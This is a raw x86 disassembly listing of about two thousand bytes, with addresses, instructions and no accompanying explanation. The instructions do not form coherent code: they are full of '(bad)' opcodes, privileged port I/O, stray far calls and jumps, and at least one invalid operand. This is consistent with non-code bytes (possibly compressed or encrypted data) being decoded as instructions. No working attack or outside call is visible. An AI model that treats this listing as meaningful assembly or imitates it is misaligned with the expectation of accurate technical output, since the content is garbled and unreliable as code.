  40e7bc:	mov    edi,0x942488bc
  40e7c1:	mov    ch,0xb2
  40e7c3:	out    dx,eax
  40e7c4:	lahf   
  40e7c5:	ja     0x40e82e
  40e7c7:	sub    al,BYTE PTR [edx-0x74]
  40e7ca:	fld    DWORD PTR [eax+0x7b]
  40e7cd:	cmp    ah,bl
  40e7cf:	pop    ds
  40e7d0:	xchg   ebp,eax
  40e7d1:	nop
  40e7d2:	mov    esi,0x6044fb8
  40e7d7:	add    dh,BYTE PTR [edx+0x5599cfed]
  40e7dd:	cli    
  40e7de:	jg     0x40e7e3
  40e7e0:	adc    ch,BYTE PTR [eax]
  40e7e2:	xor    al,0xc0
  40e7e4:	(bad)  
  40e7e5:	std    
  40e7e6:	cld    
  40e7e7:	(bad)  
  40e7e8:	clc    
  40e7e9:	mov    fs,WORD PTR [ebx]
  40e7eb:	pop    esp
  40e7ec:	jnp    0x40e833
  40e7ee:	das    
  40e7ef:	push   ss
  40e7f0:	adc    al,0xec
  40e7f2:	jns    0x40e7e0
  40e7f4:	out    dx,al
  40e7f5:	cmp    DWORD PTR [ecx-0x50c7d783],eax
  40e7fb:	into   
  40e7fc:	ret    
  40e7fd:	mov    ecx,0xb704d8d
  40e802:	nop
  40e803:	pusha  
  40e804:	mov    ebx,0xb3c60062
  40e809:	fnsave [eax]
  40e80b:	sub    DWORD PTR [edi],eax
  40e80d:	les    esp,FWORD PTR [edi-0x5e88f3f4]
  40e813:	dec    edx
  40e814:	adc    edi,DWORD PTR [ebx-0x6e85ae]
  40e81a:	jns    0x40e868
  40e81c:	sbb    eax,0x481f4ceb
  40e821:	xor    DWORD PTR [edx-0x6d8303b],edx
  40e827:	mov    bh,0x59
  40e829:	xchg   edx,eax
  40e82a:	stc    
  40e82b:	cwde   
  40e82c:	call   0x7590:0x14c0eab5
  40e833:	stos   BYTE PTR es:[edi],al
  40e834:	dec    edx
  40e835:	push   edi
  40e836:	(bad)  
  40e837:	out    0xf5,al
  40e839:	bound  edx,QWORD PTR [edx-0x3d5b3c81]
  40e83f:	push   0xc81b4c94
  40e844:	inc    edx
  40e845:	cli    
  40e846:	pop    eax
  40e847:	arpl   WORD PTR [esi],cx
  40e849:	push   edx
  40e84a:	in     eax,dx
  40e84b:	mov    ecx,0xfcdfe83
  40e850:	dec    edx
  40e851:	or     al,0x4e
  40e853:	stos   BYTE PTR es:[edi],al
  40e854:	int3   
  40e855:	cmc    
  40e856:	or     ah,BYTE PTR [ebx]
  40e858:	jecxz  0x40e886
  40e85a:	mov    ebp,0x74c7d212
  40e85f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e860:	fs int3 
  40e862:	lds    esi,FWORD PTR [ecx-0x1d4532c6]
  40e868:	jg     0x40e8ae
  40e86a:	or     DWORD PTR [ecx-0x60],esp
  40e86d:	jl     0x40e821
  40e86f:	dec    ebx
  40e870:	lods   eax,DWORD PTR ds:[esi]
  40e871:	fistp  QWORD PTR [edi+0x2ee32af6]
  40e877:	mov    bl,0xd5
  40e879:	scas   eax,DWORD PTR es:[edi]
  40e87a:	lock xor ebx,DWORD PTR [eax]
  40e87d:	jb     0x40e8c4
  40e87f:	cmp    dl,BYTE PTR [edx+0x5120297c]
  40e885:	rol    BYTE PTR [edx],1
  40e887:	fist   DWORD PTR [edi+0x6a0f93ac]
  40e88d:	sub    cl,BYTE PTR [edi+0x67999374]
  40e893:	mov    DWORD PTR [edi],edx
  40e895:	or     BYTE PTR [ecx-0x22e57cdd],dh
  40e89b:	fcomp  QWORD PTR [edi+0x26]
  40e89e:	mov    cl,dh
  40e8a0:	add    edx,DWORD PTR [eax+0x6b]
  40e8a3:	out    0x2c,al
  40e8a5:	rol    DWORD PTR [eax],cl
  40e8a7:	xor    BYTE PTR [edi],0x81
  40e8aa:	add    BYTE PTR [edx-0xc7bb87d],cl
  40e8b0:	push   edx
  40e8b1:	clc    
  40e8b2:	or     eax,0xf5d074b4
  40e8b8:	data16 sub BYTE PTR [ecx+0x21d82b50],ch
  40e8bf:	lock sub esp,DWORD PTR [edi-0x3a]
  40e8c3:	shl    eax,0xc3
  40e8c6:	xchg   edi,eax
  40e8c7:	test   al,0xd5
  40e8c9:	les    esi,FWORD PTR [ebx-0x64209e39]
  40e8cf:	cs retf 0x2b87
  40e8d3:	ret    
  40e8d4:	rol    dh,1
  40e8d6:	pop    es
  40e8d7:	repnz sahf 
  40e8d9:	inc    ecx
  40e8da:	mov    esi,gs
  40e8dc:	ss test eax,0x3d07112e
  40e8e2:	push   edx
  40e8e3:	mov    di,0xfee1
  40e8e7:	cwde   
  40e8e8:	(bad)
  40e8ec:	shr    BYTE PTR [edi],0x82
  40e8ef:	add    BYTE PTR [esi],dh
  40e8f1:	inc    ebx
  40e8f2:	test   al,0xe5
  40e8f4:	in     eax,dx
  40e8f5:	xchg   BYTE PTR [ebx],dh
  40e8f7:	add    eax,0x87ce9ed7
  40e8fc:	sub    al,0xbe
  40e8fe:	push   edi
  40e8ff:	mov    al,0x1a
  40e901:	jne    0x40e932
  40e903:	mov    dl,0x2b
  40e905:	xor    ebp,DWORD PTR [esi+0x44]
  40e908:	mov    ebx,0x1a396761
  40e90d:	cld    
  40e90e:	bound  edx,QWORD PTR [edi*8+0x75ee180d]
  40e915:	mul    DWORD PTR [ecx+edx*1+0x7b4032b6]
  40e91c:	mov    edx,DWORD PTR [ebx-0x4625676a]
  40e922:	mov    dl,0xbf
  40e924:	add    edi,DWORD PTR [esi-0x7]
  40e927:	adc    al,0x53
  40e929:	add    DWORD PTR [ecx-0x587a3c51],ebx
  40e92f:	popf   
  40e930:	popa   
  40e931:	cs dec ebx
  40e933:	pop    ss
  40e934:	dec    ecx
  40e935:	(bad)  
  40e937:	movaps xmm1,XMMWORD PTR [edx+esi*8-0x28]
  40e93c:	test   BYTE PTR [ecx+0x2c],ch
  40e93f:	adc    BYTE PTR [ecx-0x389065f6],bh
  40e945:	fnsave [ecx-0x43]
  40e948:	imul   ebp,DWORD PTR [esi-0x51],0x31
  40e94c:	xlat   BYTE PTR ds:[ebx]
  40e94d:	mov    DWORD PTR [esi-0x71c13458],ebx
  40e953:	ja     0x40e9b7
  40e955:	mov    ah,BYTE PTR [esi-0x4c]
  40e958:	xor    al,0x4c
  40e95a:	push   ds
  40e95b:	rol    ebp,cl
  40e95d:	jo     0x40e9ac
  40e95f:	arpl   bp,di
  40e961:	mov    ds:0xf45c9376,al
  40e966:	fnstcw WORD PTR ds:0x6f48e690
  40e96c:	pop    ecx
  40e96d:	sbb    al,0x79
  40e96f:	imul   edx,DWORD PTR [ebp-0x4b108420],0xb22bb053
  40e979:	or     ch,BYTE PTR [ebp-0x52]
  40e97c:	int3   
  40e97d:	xor    ebx,DWORD PTR [ecx]
  40e97f:	iret   
  40e980:	push   edi
  40e981:	mov    al,0x1a
  40e983:	lahf   
  40e984:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e986:	cmc    
  40e987:	cmp    eax,0xc15b4a42
  40e98c:	scas   eax,DWORD PTR es:[edi]
  40e98d:	xor    al,0xa4
  40e98f:	mov    bh,bl
  40e991:	out    dx,al
  40e992:	or     DWORD PTR [ebp+0x390176c5],esp
  40e998:	pop    ds
  40e999:	aad    0x1a
  40e99b:	fcom   DWORD PTR [eax+ebx*2-0x5d9613d7]
  40e9a2:	push   cs
  40e9a3:	(bad)  
  40e9a4:	shl    DWORD PTR [esi+edx*4-0x4b],1
  40e9a8:	mov    BYTE PTR [ebx+ecx*8+0x762efdd7],0xcf
  40e9b0:	ja     0x40e9eb
  40e9b2:	jmp    0xafe908e4
  40e9b7:	jo     0x40e97f
  40e9b9:	mov    bh,0x31
  40e9bb:	xchg   ebp,eax
  40e9bc:	add    al,0x2a
  40e9be:	arpl   WORD PTR [ebp+0x3d],bp
  40e9c1:	cld    
  40e9c2:	shl    eax,cl
  40e9c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9c5:	pop    ecx
  40e9c6:	and    BYTE PTR [ebx],cl
  40e9c8:	inc    ebx
  40e9c9:	in     al,dx
  40e9ca:	iret   
  40e9cb:	jl     0x40ea0f
  40e9cd:	or     DWORD PTR [esi+0x2c],ebp
  40e9d0:	adc    edi,DWORD PTR [esi+0x7baa2fd0]
  40e9d6:	arpl   WORD PTR [ecx],cx
  40e9d8:	pop    DWORD PTR [ecx-0x66f9b21b]
  40e9de:	bound  ebx,QWORD PTR [ecx-0x316205f3]
  40e9e4:	jmp    0x10f19d92
  40e9e9:	dec    ebp
  40e9ea:	push   es
  40e9eb:	push   ds
  40e9ec:	sub    ebp,ecx
  40e9ee:	add    BYTE PTR ds:0x1f3a8ff1,ah
  40e9f4:	and    al,0xc
  40e9f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9f7:	(bad)  
  40e9f8:	jns    0x40e9c5
  40e9fa:	or     ah,BYTE PTR [edx]
  40e9fc:	in     al,0x4d
  40e9fe:	das    
  40e9ff:	or     ecx,ebx
  40ea01:	ss (bad) 
  40ea03:	cs mov bl,0x57
  40ea06:	add    BYTE PTR [eax],cl
  40ea08:	retf   
  40ea09:	push   cs
  40ea0a:	in     eax,0x77
  40ea0c:	and    eax,0xf04a228d
  40ea11:	cmp    ebx,DWORD PTR [ebx]
  40ea13:	push   ds
  40ea14:	sbb    al,0x24
  40ea16:	and    ah,BYTE PTR [eax]
  40ea18:	push   cs
  40ea19:	xor    ah,BYTE PTR [ebx-0x60]
  40ea1c:	stos   BYTE PTR es:[edi],al
  40ea1d:	mov    eax,0x371c3b5c
  40ea22:	jle    0x40ea69
  40ea24:	xchg   esp,eax
  40ea25:	mov    edi,0x3d11cdf1
  40ea2a:	pop    esi
  40ea2b:	in     al,0x9b
  40ea2d:	dec    edi
  40ea2e:	lock int 0x89
  40ea31:	push   es
  40ea32:	out    0x12,eax
  40ea34:	jns    0x40ea00
  40ea36:	mov    DWORD PTR [eax+0x4b],ecx
  40ea39:	push   edi
  40ea3a:	fld1   
  40ea3c:	add    ecx,DWORD PTR [esi]
  40ea3e:	test   al,0xd0
  40ea40:	mov    cl,0xf0
  40ea42:	es lahf 
  40ea44:	sub    ebx,eax
  40ea46:	xchg   ebx,eax
  40ea47:	xchg   esi,eax
  40ea48:	xor    DWORD PTR [ecx+ebx*8-0x408f5869],0xffffff90
  40ea50:	pop    edi
  40ea51:	xlat   BYTE PTR ds:[ebx]
  40ea52:	inc    ebp
  40ea53:	rcl    BYTE PTR [edi-0x39687e3c],cl
  40ea59:	(bad)  
  40ea5a:	mov    DWORD PTR [ebx+0x45],0x320c226a
  40ea61:	push   0xfffffff5
  40ea63:	mov    WORD PTR [ebx-0x2c],fs
  40ea66:	adc    ebp,ecx
  40ea68:	lahf   
  40ea69:	adc    esp,ebp
  40ea6b:	jb     0x40eaa3
  40ea6d:	nop
  40ea6e:	mov    ds:0x8191877a,eax
  40ea73:	jp     0x40ea37
  40ea75:	sti    
  40ea76:	cmp    al,0xfa
  40ea78:	xchg   edi,eax
  40ea79:	xor    DWORD PTR [edx+0x21],edx
  40ea7c:	stos   BYTE PTR es:[edi],al
  40ea7d:	retf   0x4c8d
  40ea80:	sbb    al,0xb6
  40ea82:	dec    esp
  40ea83:	xchg   ebp,eax
  40ea84:	(bad)  
  40ea85:	arpl   WORD PTR [eax],di
  40ea87:	aad    0xb6
  40ea89:	adc    eax,0x3293064e
  40ea8e:	mov    ebp,0xd067966d
  40ea93:	sbb    DWORD PTR [ebp-0x3d147e8e],eax
  40ea99:	xchg   DWORD PTR [edx-0x59],edi
  40ea9c:	mov    edi,DWORD PTR [ecx]
  40ea9e:	sub    ebp,DWORD PTR [edi]
  40eaa0:	sbb    BYTE PTR gs:[ecx-0x44],bh
  40eaa4:	leave  
  40eaa5:	add    DWORD PTR es:[eax],0xc08e871
  40eaac:	ins    BYTE PTR es:[edi],dx
  40eaad:	or     ah,dl
  40eaaf:	jo     0x40ea69
  40eab1:	fisubr WORD PTR [eax+0x6eacf400]
  40eab7:	fsub   DWORD PTR [ebp-0x14]
  40eaba:	mov    ss,WORD PTR [eax]
  40eabc:	popf   
  40eabd:	ja     0x40ea89
  40eabf:	mov    bl,BYTE PTR [eax]
  40eac1:	out    dx,eax
  40eac2:	popa   
  40eac3:	add    ebp,edi
  40eac5:	xlat   BYTE PTR ds:[ebx]
  40eac6:	push   ebx
  40eac7:	fadd   DWORD PTR [eax+eax*8-0x4b473bda]
  40eace:	(bad)  [ecx+0x17dfe0f3]
  40ead4:	jo     0x40eb3e
  40ead6:	sub    bl,bl
  40ead8:	in     al,dx
  40ead9:	inc    edx
  40eada:	sahf   
  40eadb:	in     eax,0xd9
  40eadd:	call   0x7f9dc4be
  40eae2:	mov    DWORD PTR [edx-0x16444f4b],ecx
  40eae8:	pop    edx
  40eae9:	iret   
  40eaea:	and    edi,DWORD PTR [esi]
  40eaec:	scas   al,BYTE PTR es:[edi]
  40eaed:	and    dh,ah
  40eaef:	repz fnstsw WORD PTR [ebx+0x5a2219e0]
  40eaf6:	add    DWORD PTR [edi-0x24],ecx
  40eaf9:	pushf  
  40eafa:	xor    eax,DWORD PTR [edx-0x38264c53]
  40eb00:	test   BYTE PTR [ecx+0x76],bh
  40eb03:	test   DWORD PTR [eax+0x45744892],ebx
  40eb09:	xor    BYTE PTR [esi],ah
  40eb0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb0c:	call   0x82db:0x5d46b6aa
  40eb13:	inc    ecx
  40eb14:	and    eax,0x670f19cd
  40eb19:	xchg   esi,eax
  40eb1a:	fcom   DWORD PTR ds:0x76679725
  40eb20:	ss test al,0x28
  40eb23:	call   0xd800:0xa913d2d0
  40eb2a:	(bad)  
  40eb2b:	pop    edi
  40eb2c:	pmulhuw mm6,mm7
  40eb2f:	scas   al,BYTE PTR es:[edi]
  40eb30:	int    0xb3
  40eb32:	jl     0x40eac7
  40eb34:	in     eax,0xaa
  40eb36:	dec    esi
  40eb37:	(bad)  
  40eb38:	jae    0x40eacd
  40eb3a:	pushf  
  40eb3b:	mov    dl,0xee
  40eb3d:	pushf  
  40eb3e:	into   
  40eb3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb40:	out    0x36,eax
  40eb42:	(bad)  
  40eb43:	out    dx,al
  40eb44:	sub    cl,0x27
  40eb47:	sahf   
  40eb48:	pop    ecx
  40eb49:	xor    BYTE PTR [edi-0x3a275f1d],al
  40eb4f:	fmul   DWORD PTR [edi-0x6ab07e21]
  40eb55:	mov    ebp,0x18168325
  40eb5a:	daa    
  40eb5b:	out    dx,eax
  40eb5c:	mov    bl,dh
  40eb5e:	nop
  40eb5f:	xlat   BYTE PTR ds:[ebx]
  40eb60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb62:	xlat   BYTE PTR ds:[ebx]
  40eb63:	aaa    
  40eb64:	lock pop es
  40eb66:	fwait
  40eb67:	dec    esi
  40eb68:	jmp    0x40eb12
  40eb6a:	loopne 0x40eb1c
  40eb6c:	stc    
  40eb6d:	mul    BYTE PTR [esi]
  40eb6f:	push   edx
  40eb70:	lods   al,BYTE PTR ds:[si]
  40eb72:	daa    
  40eb73:	aas    
  40eb74:	cmp    DWORD PTR ds:0x3e01a6cc,edx
  40eb7a:	jg     0x40eb3b
  40eb7c:	(bad)  
  40eb7e:	cmp    bh,bh
  40eb80:	xchg   BYTE PTR [eax-0x4c],bl
  40eb83:	xor    eax,0xc3beca09
  40eb88:	inc    edi
  40eb89:	or     eax,0xb6334a6a
  40eb8e:	push   0x66
  40eb90:	mov    al,ds:0xe861eadd
  40eb95:	lea    ebp,es:[esp+ebp*2]
  40eb99:	sbb    ecx,edx
  40eb9b:	popf   
  40eb9c:	sub    DWORD PTR [ebx+0x1f4879ca],edi
  40eba2:	and    al,0x25
  40eba4:	adc    eax,0x1026efba
  40eba9:	and    DWORD PTR [ecx-0x63faa887],ecx
  40ebaf:	sti    
  40ebb0:	adc    dl,BYTE PTR [edx]
  40ebb2:	js     0x40ec03
  40ebb4:	sub    al,0x43
  40ebb6:	in     al,0x79
  40ebb8:	pop    es
  40ebb9:	jmp    0x40eb76
  40ebbb:	jecxz  0x40ebae
  40ebbd:	sti    
  40ebbe:	sar    BYTE PTR [esi-0x17],1
  40ebc1:	out    0x34,eax
  40ebc3:	cmp    BYTE PTR [edx+0x5710bbc8],al
  40ebc9:	pop    edx
  40ebca:	jmp    0x40eb7e
  40ebcc:	daa    
  40ebcd:	add    bl,dh
  40ebcf:	pop    eax
  40ebd0:	lods   al,BYTE PTR ds:[esi]
  40ebd1:	fdiv   DWORD PTR [ecx-0x1902541b]
  40ebd7:	aad    0x40
  40ebd9:	ds mov al,0xda
  40ebdc:	sub    al,0xb1
  40ebde:	out    dx,eax
  40ebdf:	in     al,dx
  40ebe0:	aaa    
  40ebe1:	std    
  40ebe2:	ins    DWORD PTR es:[edi],dx
  40ebe3:	inc    ebp
  40ebe4:	jmp    0xf499158e
  40ebe9:	cld    
  40ebea:	pop    ebx
  40ebeb:	or     BYTE PTR [ebx-0x44],ah
  40ebee:	retf   0x7ca2
  40ebf1:	lahf   
  40ebf2:	and    DWORD PTR [ebx+0x7bd6892c],edi
  40ebf8:	test   al,0x25
  40ebfa:	jmp    0x40eb86
  40ebfc:	idiv   DWORD PTR [edx]
  40ebfe:	xchg   ebp,eax
  40ebff:	loope  0x40ec07
  40ec01:	call   DWORD PTR [esi-0x7d23b512]
  40ec07:	push   ebp
  40ec08:	mov    edx,0x13b4d268
  40ec0d:	jmp    0xb183:0x8a8c06ea
  40ec14:	add    ecx,DWORD PTR [ebp+0x28130e3e]
  40ec1a:	mov    ebx,0xf76001ea
  40ec1f:	aaa    
  40ec20:	(bad)  
  40ec21:	sub    eax,0x31b960f1
  40ec26:	sti    
  40ec27:	or     DWORD PTR [esi+0x8],esp
  40ec2a:	jo     0x40ebc0
  40ec2c:	mov    DWORD PTR [edx+0x45cda016],0x7cfb3b9e
  40ec36:	out    dx,al
  40ec37:	sbb    eax,0xc0472172
  40ec3c:	push   esp
  40ec3d:	adc    eax,DWORD PTR [ebx-0x30]
  40ec40:	(bad)
  40ec43:	mov    esi,0x8eb6108c
  40ec48:	test   DWORD PTR [edi-0xb],ebp
  40ec4b:	arpl   WORD PTR [eax+0x517df752],bx
  40ec51:	pusha  
  40ec52:	jge    0x40ebd9
  40ec54:	fimul  WORD PTR [esi]
  40ec56:	pushf  
  40ec57:	adc    eax,0xc8a9ba7d
  40ec5c:	and    bh,BYTE PTR [ebp-0x4e98d027]
  40ec62:	shl    ebx,1
  40ec64:	fdivrp st(7),st
  40ec66:	inc    BYTE PTR [eax+edi*8]
  40ec69:	ficomp WORD PTR ds:0x5eb1a348
  40ec6f:	pop    edx
  40ec70:	jbe    0x40ebf3
  40ec72:	loop   0x40ecee
  40ec74:	or     DWORD PTR [eax+0x48d355de],edi
  40ec7a:	jo     0x40ec94
  40ec7c:	adc    eax,0x7a951430
  40ec81:	loope  0x40ecd1
  40ec83:	push   0x5e
  40ec85:	retf   0x2f0e
  40ec88:	loop   0x40ec95
  40ec8a:	xor    BYTE PTR ds:0x22c10ba4,cl
  40ec90:	xchg   esp,eax
  40ec91:	out    0x69,al
  40ec93:	ret    
  40ec94:	mov    esi,0x25201423
  40ec99:	bound  esi,QWORD PTR [ecx-0x38]
  40ec9c:	div    DWORD PTR ds:0xc9c1163c
  40eca2:	mov    bh,0x75
  40eca4:	xor    BYTE PTR [edi+eiz*1-0x7b911848],ah
  40ecab:	rol    BYTE PTR [esi-0x717ed6c7],0x7
  40ecb2:	mov    al,al
  40ecb4:	iret   
  40ecb5:	(bad)  
  40ecb6:	arpl   WORD PTR [eax-0x1d249572],sp
  40ecbc:	in     al,dx
  40ecbd:	xchg   esi,eax
  40ecbe:	add    al,0x5a
  40ecc0:	sub    eax,0x7939e086
  40ecc5:	fs push ecx
  40ecc7:	fsub   QWORD PTR [ebx+0x9]
  40ecca:	dec    esi
  40eccb:	addr16 inc ebp
  40eccd:	mov    ebp,DWORD PTR [ebx-0x1a39905c]
  40ecd3:	mov    al,0x1f
  40ecd5:	mov    al,BYTE PTR [ecx]
  40ecd7:	cmp    al,0xbc
  40ecd9:	and    al,0xb5
  40ecdb:	and    DWORD PTR [ecx],ebp
  40ecdd:	mov    ss:0x9816f28d,eax
  40ece3:	popa   
  40ece4:	or     BYTE PTR [edx-0x7f],dl
  40ece7:	fcmovbe st,st(3)
  40ece9:	dec    esp
  40ecea:	std    
  40eceb:	jbe    0x40ed0f
  40eced:	xor    DWORD PTR [ebp+edx*8+0x3fc3a1ba],edi
  40ecf4:	adc    DWORD PTR [ebx+0x58],eax
  40ecf7:	mov    ebp,0x316c501c
  40ecfc:	mov    ah,0x37
  40ecfe:	prefetcht0 BYTE PTR [ebx+ebp*8+0x57]
  40ed03:	sbb    dl,BYTE PTR [eax-0x2ede0368]
  40ed09:	das    
  40ed0a:	int    0x6a
  40ed0c:	inc    ecx
  40ed0d:	push   es
  40ed0e:	xchg   eax,ebx
  40ed10:	mov    esp,0xad915f8d
  40ed15:	(bad)  
  40ed16:	cli    
  40ed17:	push   edi
  40ed18:	das    
  40ed19:	pushf  
  40ed1a:	mov    ds:0x864b219b,eax
  40ed1f:	cmp    eax,0xfc0836d3
  40ed24:	cwde   
  40ed25:	sbb    BYTE PTR [ecx],cl
  40ed27:	stos   DWORD PTR es:[edi],eax
  40ed28:	mov    al,0x94
  40ed2a:	xlat   BYTE PTR ds:[ebx]
  40ed2b:	popa   
  40ed2c:	shl    DWORD PTR [edx-0x6fdd7861],cl
  40ed32:	mov    ds:0xbd4040bb,eax
  40ed37:	fisttp DWORD PTR [esi]
  40ed39:	push   eax
  40ed3a:	mov    esi,0x6b13a402
  40ed3f:	rol    DWORD PTR [eax+ebp*1-0x5b988f6],cl
  40ed46:	xchg   esp,eax
  40ed47:	mov    esi,0xd6c88c71
  40ed4c:	dec    edx
  40ed4d:	pop    ss
  40ed4e:	nop
  40ed4f:	lea    ebx,[edi]
  40ed51:	(bad)  
  40ed52:	in     eax,0xb2
  40ed54:	frstor [edi-0x66d189e4]
  40ed5a:	and    BYTE PTR [eax-0x561c0fe9],bl
  40ed60:	sub    ch,BYTE PTR [ecx]
  40ed62:	gs cmp dl,dl
  40ed65:	(bad)  
  40ed66:	cs (bad) 
  40ed69:	jmp    0x3fcccfee
  40ed6e:	imul   eax,ecx,0xffffffb8
  40ed71:	jp     0x40ed8c
  40ed73:	dec    esp
  40ed74:	sub    al,cl
  40ed76:	inc    ebx
  40ed77:	ret    0x629c
  40ed7a:	pop    ds
  40ed7b:	xchg   esi,eax
  40ed7c:	fcomi  st,st(6)
  40ed7e:	xor    al,0x16
  40ed80:	lods   eax,DWORD PTR ds:[esi]
  40ed81:	dec    ebx
  40ed82:	xchg   edx,eax
  40ed83:	bound  ebx,QWORD PTR [ebx+0x3d9e86af]
  40ed89:	pop    ebp
  40ed8a:	loopne 0x40edc1
  40ed8c:	cwde   
  40ed8d:	into   
  40ed8e:	shl    al,0x6d
  40ed91:	mov    ebp,0x83b7dc34
  40ed96:	sbb    bh,BYTE PTR [ebp+0x69]
  40ed99:	sti    
  40ed9a:	fsub   QWORD PTR [edx]
  40ed9c:	mov    eax,0xce5c3b4
  40eda1:	ficomp WORD PTR [ebp+0x56f384d0]
  40eda7:	sub    esp,DWORD PTR [ebp-0x3f]
  40edaa:	cmp    eax,0x6a55bb2c
  40edaf:	mov    ebp,0x975c9f86
  40edb4:	sbb    eax,0xc13a2bdf
  40edb9:	cmp    BYTE PTR [eax+eiz*8+0x4f0aab28],0xfd
  40edc1:	bound  ecx,QWORD PTR [ebx+0x140e401f]
  40edc7:	rol    DWORD PTR [eax],1
  40edc9:	fild   DWORD PTR [edi+0x5178a1ac]
  40edcf:	mov    ch,0x5f
  40edd1:	ret    
  40edd2:	cmp    al,dh
  40edd4:	xchg   esi,eax
  40edd5:	cmp    eax,0x6f9bedeb
  40edda:	or     edi,DWORD PTR [ecx]
  40eddc:	cwde   
  40eddd:	ret    0x7fe0
  40ede0:	push   es
  40ede1:	or     eax,DWORD PTR ds:0xf1f045c1
  40ede7:	cmp    eax,0x40c2261b
  40edec:	dec    ebx
  40eded:	and    al,0x2
  40edef:	add    eax,0xa2adcfe2
  40edf4:	std    
  40edf5:	and    eax,0x6d5d8824
  40edfa:	push   ebx
  40edfb:	outs   dx,DWORD PTR ds:[esi]
  40edfc:	pop    esi
  40edfd:	inc    eax
  40edfe:	sub    eax,0xffb90d1b
  40ee03:	mov    edx,DWORD PTR [ecx]
  40ee05:	sbb    dl,ah
  40ee07:	in     eax,dx
  40ee08:	mov    al,0x74
  40ee0a:	in     eax,0x8c
  40ee0c:	pop    esi
  40ee0d:	push   0x8525eeb8
  40ee12:	and    al,0xb7
  40ee14:	or     DWORD PTR [edx-0x1b],eax
  40ee17:	scas   al,BYTE PTR es:[edi]
  40ee18:	adc    edx,ebp
  40ee1a:	les    ebp,FWORD PTR ss:[edx-0x4e1a310c]
  40ee21:	lahf   
  40ee22:	rol    esp,cl
  40ee24:	es cmp al,0x9e
  40ee27:	ss inc ecx
  40ee29:	out    dx,al
  40ee2a:	cmc    
  40ee2b:	popa   
  40ee2c:	cmp    DWORD PTR [edi-0x5bb89eb5],ebx
  40ee32:	icebp  
  40ee33:	aam    0x27
  40ee35:	push   ds
  40ee36:	ins    DWORD PTR es:[edi],dx
  40ee37:	stos   BYTE PTR es:[edi],al
  40ee38:	cmc    
  40ee39:	sub    al,BYTE PTR cs:[edx]
  40ee3c:	sbb    dl,BYTE PTR [edi-0x1d]
  40ee3f:	dec    BYTE PTR ds:0x8c99a02f
  40ee45:	mov    bl,0x9c
  40ee47:	add    DWORD PTR [ebp-0x7165e777],esi
  40ee4d:	aas    
  40ee4e:	push   0x26
  40ee50:	lahf   
  40ee51:	arpl   WORD PTR [edi-0x36],cx
  40ee54:	adc    esp,DWORD PTR [ecx+0x0]
  40ee57:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40ee59:	sar    DWORD PTR [ebx-0x417e43ee],cl
  40ee5f:	(bad)  
  40ee60:	retf   0xce15
  40ee63:	shl    DWORD PTR ds:0x29ff3b0d,1
  40ee69:	stc    
  40ee6a:	mov    BYTE PTR [esi+eiz*2+0x67],cl
  40ee6e:	mov    DWORD PTR [ecx],ebp
  40ee70:	mov    bh,0xfe
  40ee72:	dec    esp
  40ee73:	jb     0x40eec5
  40ee75:	fstp   DWORD PTR [esi-0x4e]
  40ee78:	jp     0x40ee09
  40ee7a:	rcl    DWORD PTR [ebp+0x536cb47a],cl
  40ee80:	lock sbb bl,al
  40ee83:	push   ebx
  40ee84:	jmp    0xb50927cb
  40ee89:	std    
  40ee8a:	xor    BYTE PTR ds:0xad5020d8,ch
  40ee90:	jmp    0x40ee5e
  40ee92:	adc    esi,DWORD PTR [ebx+ebp*1-0x16dc3510]
  40ee99:	mov    al,ds:0xff4de1a5
  40ee9e:	or     al,BYTE PTR [esp+edx*8]
  40eea1:	pushf  
  40eea2:	jnp    0x40eec6
  40eea4:	jmp    0x34de:0x9371bdaf
  40eeab:	push   cs
  40eeac:	in     eax,0xc1
  40eeae:	(bad)  
  40eeb0:	inc    edx
  40eeb1:	dec    eax
  40eeb2:	imul   esi,DWORD PTR [edi-0x74],0x1a
  40eeb6:	mov    DWORD PTR [edx-0xb],ebx
  40eeb9:	cmpxchg esp,ebp
  40eebc:	popa   
  40eebd:	dec    esp
  40eebe:	(bad)  
  40eebf:	loope  0x40eeed
  40eec1:	clc    
  40eec2:	cmp    edx,edx
  40eec4:	stos   DWORD PTR es:[edi],eax
  40eec5:	fdivp  st(7),st
  40eec7:	push   ebp
  40eec8:	mov    bl,0x99
  40eeca:	int3   
  40eecb:	push   edi
  40eecc:	stc    
  40eecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eece:	sti    
  40eecf:	mov    ch,0x4c
  40eed1:	xchg   esp,eax
  40eed2:	lods   al,BYTE PTR ds:[esi]
  40eed3:	ins    BYTE PTR es:[edi],dx
  40eed4:	push   es
  40eed5:	push   ecx
  40eed6:	std    
  40eed7:	imul   esp,DWORD PTR [ebx+0x4],0x4c78d486
  40eede:	sbb    bl,0xf9
  40eee1:	jp     0x40eed4
  40eee3:	push   ebx
  40eee4:	pusha  
  40eee5:	pop    edx
  40eee6:	or     al,0x10
  40eee8:	push   eax
  40eee9:	int3   
  40eeea:	mov    cs,esi
  40eeec:	mov    ecx,0x307767a4
  40eef1:	dec    edx
  40eef3:	push   0x6bbdc31e
  40eef8:	xor    ecx,DWORD PTR [ebx-0x77]
  40eefb:	jl     0x40ef59
  40eefd:	aas    
  40eefe:	mov    eax,ds:0xf7e71180
  40ef03:	call   FWORD PTR gs:[ebx]
  40ef06:	loop   0x40eed2
  40ef08:	fsubr  QWORD PTR [ecx]
  40ef0a:	mov    esp,0xf86bc565
  40ef0f:	mov    edx,0x81166386
  40ef14:	xchg   ebp,eax
  40ef15:	jmp    0xf794:0xac90de2f
  40ef1c:	jl     0x40ef7d
  40ef1e:	dec    ebx
  40ef1f:	jecxz  0x40eeb3
  40ef21:	stc    
  40ef22:	pop    edx
  40ef23:	retf   
  40ef24:	mov    DWORD PTR [ebx+ecx*4],esp
  40ef27:	mov    edx,0xe28bdaa5
  40ef2c:	mov    al,ds:0xc7ca856
  40ef31:	into   
  40ef32:	iret   
  40ef33:	mov    ?,WORD PTR [eax-0x76]
  40ef36:	std    
  40ef37:	mov    bh,0xfd
  40ef39:	retf   
  40ef3a:	mov    esi,eax
  40ef3c:	and    al,bl
